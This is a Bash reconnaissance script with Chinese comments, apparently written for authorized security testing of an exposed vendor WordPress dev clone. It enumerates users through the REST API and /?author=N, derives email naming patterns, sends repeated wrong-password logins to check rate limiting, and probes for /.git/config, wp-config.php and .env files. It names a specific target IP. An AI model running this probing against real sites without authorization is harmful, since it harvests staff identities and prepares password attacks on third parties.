#!/usr/bin/env bash
# =============================================================================
# 供应商 dev 副本 WordPress 站公网无鉴权暴露（泛解析 vhost）
#   线索链：生产站 /blog/wp-json/wp/v2/users 的 user.url 字段 → 外包商域名 →
#            *.vendor.tld 泛解析到单 IP → 同一主题的生产克隆完整可读
#
# 用法：
#   H=https://vendor-dev.example.com bash vendor_dev_wp_expose.sh
#   H=https://vendor-dev.example.com IP=185.184.248.41 bash vendor_dev_wp_expose.sh
#   （泛解析站点建议 --resolve 钉住 IP；本机挂代理时必须 --noproxy '*' 才生效）
#
# 判据（四条，缺一不算完整命中）：
#   1) GET / → 200，generator=WordPress x.y.z，主题与生产同款
#   2) GET /wp-json/wp/v2/users?per_page=100 → 200 JSON 数组，账号集与生产同源
#   3) GET /?author=N（REST 未列出的 id）→ 200，泄露作者显示名 + 邮箱派生 slug
#   4) GET /wp-login.php → 200 登录表单；连续错口令无 429 / 无锁定 / 无验证码
# =============================================================================
set -u

H="${H:-https://TARGET}"; H="${H%/}"
IP="${IP:-}"
UA="${ARTEX_UA:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36}"

if [ -n "$IP" ]; then
  # 泛解析：强制把 Host 解析到指定回源 IP
  HOSTP="${H#*://}"; HOSTP="${HOSTP%%/*}"
  req(){ curl -sk --noproxy '*' --max-time 25 -A "$UA" --resolve "$HOSTP:443:$IP" "$@"; }
else
  req(){ curl -sk --max-time 25 -A "$UA" "$@"; }
fi

hr(){ printf '\n== %s ==\n' "$*"; }

hr "[0] DNS / vhost 归属（泛解析判定：同一站点名解析出多个 IP 属正常，回源 IP 才给 200）"
getent ahostsv4 "${H#*://}" 2>/dev/null | awk '{print "  "$1}' | sort -u | head -5

hr "[1] 指纹：整站可匿名读 + 版本 + 主题（与生产比对）"
req "$H/" -o home.html -w '  GET / -> %{http_code} | %{size_download}B\n'
grep -oiE '<meta name="generator" content="[^"]+"' home.html | head -2
grep -oiE 'wp-content/themes/[a-z0-9._-]+' home.html | sort -u | head -5
echo "  判据：200 且主题名与生产站一致 = 生产克隆；版本可被安全插件删掉，以 /wp-json/ 路由表为准"

hr "[2] 主判据：REST 匿名用户枚举"
req "$H/wp-json/wp/v2/users?per_page=100" -o users.json \
  -w '  users -> %{http_code} | %{size_download}B | %{content_type}\n'
python3 - <<'PY'
import json
try:
    d = json.load(open('users.json'))
except Exception as e:
    print("  [!] 非 JSON（WAF/安全插件拦截或路由关闭）:", e); raise SystemExit
if isinstance(d, list):
    print("  账号数 =", len(d), " ids =", [u.get('id') for u in d])
    for u in d:
        print("   - id=%-3s slug=%-40s name=%s" % (u.get('id'), u.get('slug'), u.get('name')))
    print("  [判据] 把这份 slug 集合与生产站 users 比对：同源（只少最近新增 id）= dev 是生产库克隆")
else:
    print("  [!] 非数组，可能 rest_no_route:", str(d)[:200])
PY

hr "[3] 补全：REST 未列出的 id 用 /?author=N 差分（REST 只列有公开文章的作者）"
for n in 17 18 19 20 21 22; do
  out="$(req "$H/?author=$n" -o a.html -w '%{http_code}|%{size_download}')"
  title="$(grep -oiE '<title>[^<]*' a.html | head -1 | sed 's/<title>//')"
  slug="$(grep -oiE 'author/[a-z0-9._-]+' a.html | head -1)"
  echo "  author=$n -> $out | $title | $slug"
done
echo "  [判据] 200 且标题出现真实姓名、slug 为 <name><company>-com 形态 → 直接得到邮箱命名规则"

hr "[4] 认证面：wp-login 是否直接开放（dev 通常没有生产那层边缘规则）"
req "$H/wp-login.php" -o login.html -w '  GET /wp-login.php -> %{http_code} | %{size_download}B | %{content_type}\n'
grep -qiE 'name="log"' login.html && grep -qiE 'name="pwd"' login.html \
  && echo "  [OK] 标准 wp-login 表单（name=log/pwd/wp-submit）" \
  || echo "  [-] 非登录表单：可能被重定向到 SSO / 维护页"

hr "[5] 频控判定（低频 10 次，只判有无 429/锁定/验证码）"
JAR="$(mktemp)"; trap 'rm -f "$JAR"' EXIT
req -c "$JAR" -o /dev/null "$H/wp-login.php"
i=0; hit=0
while [ $i -lt 10 ]; do
  i=$((i+1))
  out="$(req -b "$JAR" -c "$JAR" -o resp.html -w '%{http_code}|%{size_download}' -X POST "$H/wp-login.php" \
      --data-urlencode 'log=blog' --data-urlencode "pwd=Wrong$i!" \
      --data 'wp-submit=Log+In&testcookie=1&redirect_to=%2Fwp-admin%2F')"
  code="${out%%|*}"
  echo "  #$i -> $out  $(grep -oiE 'Unknown username|incorrect|not registered|Too many|locked' resp.html | head -1)"
  case "$code" in 429|403) echo "  [STOP] 出现限速/拦截"; hit=1; break;; esac
  grep -qiE 'too many|rate limit|locked|captcha' resp.html && { echo "  [STOP] 出现限速/锁定特征"; hit=1; break; }
  sleep 1
done
[ $hit -eq 0 ] && echo "  [-] 10 次均 200 登录错误页、无 Set-Cookie 会话、无 429/锁定 → 登录面无频控（仅判定，不等于可无限爆破）"

hr "[6] 边界：常见敏感文件是否被 nginx 拦掉（确认只拿到数据面而非源码/配置）"
for p in /.git/config /wp-config.php /.env /wp-content/backup.zip /wp-config.php.bak; do
  printf '  %-26s ' "$p"
  req -o /dev/null -w '%{http_code} | %{size_download}B\n' "$H$p"
done

cat <<'TIPS'

=== 失败时的常见原因 ===
1) connection refused / timeout → dev 主机已下线或被供应商关停（本例 .41 在验证后数小时内 80/443 变 refused）。
   先 dig/dnsx 确认 A 记录是否仍在；再从其他出口或过一段时间重试，别当成“漏洞修了”。
2) 同 Host 打到其他 IP 返回 403/564 → 那是 deny-all 的停放/前置节点；
   用 --resolve host:443:<回源IP> 钉住，并加 -k（证书常与 Host 不匹配）。
3) wp-json 401/403 JSON rest_* → dev 装了安全插件：改走 /?author=N 差分 + 首页作者链接。
4) users 200 但空数组 → 无公开作者；用 /wp-json/wp/v2/posts?per_page=1 的 author 字段交叉验证。
5) REST 比生产少几个 id → 正常（dev 是更早的快照）；用 /?author=<缺失id> 补。
6) wp-login 302/跳转 → 有 SSO 或维护插件；此时信息泄露结论仍成立，认证面结论作废。
7) 大量并发导致整站 5xx → 共享托管，风控会连带生产；单线程 ≥1s，禁止大字典。

=== 定性与边界 ===
- 归属：dev 副本通常属外包商资产；测试与凭据验证前先确认授权范围，别越界打第三方托管的其他站点。
- 泄露的是账号名/slug（可反推邮箱），不是口令；未拿到 wp-admin 会话就不能声称接管。
- 与生产站 wp-login 403 绕过条目区分：dev 无需任何绕过，直接 200；两条不是同一资产、不同结论。
TIPS